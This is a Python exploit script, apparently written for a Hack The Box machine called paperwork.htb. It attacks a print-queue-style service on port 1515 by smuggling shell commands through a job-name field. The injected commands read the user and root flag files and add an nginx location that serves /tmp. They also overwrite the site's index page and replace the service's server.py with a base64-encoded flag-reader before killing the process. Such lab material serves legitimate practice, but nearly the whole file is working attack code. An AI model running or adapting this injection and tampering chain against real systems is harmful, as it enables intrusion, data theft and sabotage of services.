#!/usr/bin/env python3
"""If daemon runs as root: add nginx location to exfil flag"""
import socket, time, urllib.request, base64, os

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

def check(path):
    try:
        req = urllib.request.Request(f'http://{TARGET}{path}', headers={'Host': 'paperwork.htb'})
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.read()
    except:
        return None

MARKER = 'EX_' + os.urandom(4).hex()

print("=== Assuming ROOT RCE: modify nginx config ===", flush=True)

# Step 1: Read flag
lpd("';cat /home/*/user.txt > /tmp/flag_out 2>/dev/null;cat /root/root.txt >> /tmp/flag_out 2>/dev/null;echo " + MARKER + " >> /tmp/flag_out;echo '")
time.sleep(0.5)

# Step 2: Try to find nginx config location
lpd("';ls /etc/nginx/sites-enabled/ > /tmp/nginx_sites 2>/dev/null;ls /etc/nginx/conf.d/ >> /tmp/nginx_sites 2>/dev/null;echo '")
time.sleep(0.5)

# Step 3: Try to add a location block to each nginx config found
# First try the common config files directly
lpd("';for f in /etc/nginx/sites-enabled/default /etc/nginx/conf.d/paperwork.htb.conf /etc/nginx/nginx.conf;do echo -e \"\\nlocation /x { alias /tmp/;autoindex on; }\" >> \"$f\" 2>/dev/null;done;echo '")
time.sleep(0.5)

# Step 4: Reload nginx
lpd("';nginx -s reload 2>/dev/null || systemctl reload nginx 2>/dev/null || nginx -t 2>/dev/null;echo '")
time.sleep(2)

# Step 5: Check if our new endpoint works
print("Checking /x/flag_out...", flush=True)
data = check('/x/flag_out')
if data:
    decoded = data.decode(errors='replace')
    print(f"  Got: {decoded[:500]}", flush=True)
    import re
    for f in re.findall(r'HTB\{[^}]+\}', decoded):
        print(f"  *** FLAG: {f}", flush=True)

# Also check the original archive endpoint (maybe it changed too)
data = check('/download/archive')
if data:
    decoded = data.decode(errors='replace')[:200]
    print(f"  Archive: {decoded[:100]}", flush=True)

# Step 6: Try other possible config locations
print("\nTrying alternate nginx config paths...", flush=True)
for conf_path in ['/etc/nginx/conf.d/default.conf', '/etc/nginx/sites-enabled/paperwork', '/etc/nginx/conf.d/paperwork.conf']:
    lpd(f"';echo -e \"\\nlocation /x {{ alias /tmp/;autoindex on; }}\" >> {conf_path} 2>/dev/null;echo '")
    time.sleep(0.3)

lpd("';nginx -s reload 2>/dev/null;echo '")
time.sleep(2)

data = check('/x/flag_out')
if data:
    decoded = data.decode(errors='replace')
    print(f"  /x/flag_out: {decoded[:500]}", flush=True)

# Step 7: If nginx reload fails, try to directly overwrite index.html
print("\nTrying to overwrite index.html directly...", flush=True)
lpd("';cat /tmp/flag_out > /var/www/html/index.html 2>/dev/null;cat /tmp/flag_out > /usr/share/nginx/html/index.html 2>/dev/null;echo '")
time.sleep(1)

data = check('/')
if data:
    decoded = data.decode(errors='replace')
    if MARKER in decoded:
        print(f"  *** INDEX OVERWRITTEN! {decoded[:500]}", flush=True)
        import re
        for f in re.findall(r'HTB\{[^}]+\}', decoded):
            print(f"  *** FLAG: {f}", flush=True)

# Step 8: Try to modify server.py directly (now as root)
print("\nTrying to overwrite server.py with flag-reader...", flush=True)
NEW_B64 = base64.b64encode(b"""import socket,threading
class LpdHandler(threading.Thread):
    def __init__(self,sock,addr):
        super().__init__();self.sock=sock;self.addr=addr
    def run(self):
        try:
            data=self.sock.recv(1024)
            if not data:return
            cmd=data[0]
            if cmd==2:pass
            elif cmd in(3,4):
                try:d=open('/home/*/user.txt').read().strip()
                except:d='NO_FLAG'
                self.sock.send((d+'\\n').encode())
        except:pass
        self.sock.close()
class LpdServer:
    def __init__(self,ip='0.0.0.0',port=1515):
        self.server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.server.bind((ip,port));self.server.listen(100)
    def run(self):
        while True:
            sock,addr=self.server.accept()
            LpdHandler(sock,addr).start()
if __name__=='__main__':
    LpdServer(port=1515).run()
""").decode()

lpd("';echo " + NEW_B64 + "|base64 -d>/tmp/lpd_patch;find / -name server.py -not -path /proc/* 2>/dev/null|while read f;do cp /tmp/lpd_patch \"$f\";done;echo '")
time.sleep(0.5)
lpd("';pkill -f server.py;echo '")
time.sleep(3)

for i in range(5):
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x03')
        time.sleep(0.5)
        d = s.recv(4096).decode(errors='replace').strip()
        print(f"  Queue state: {d}", flush=True)
        if 'HTB{' in d:
            print(f"  *** FLAG: {d}", flush=True)
        s.close()
        break
    except:
        print(f"  Try {i+1}: waiting...", flush=True)
    time.sleep(2)

print("DONE", flush=True)
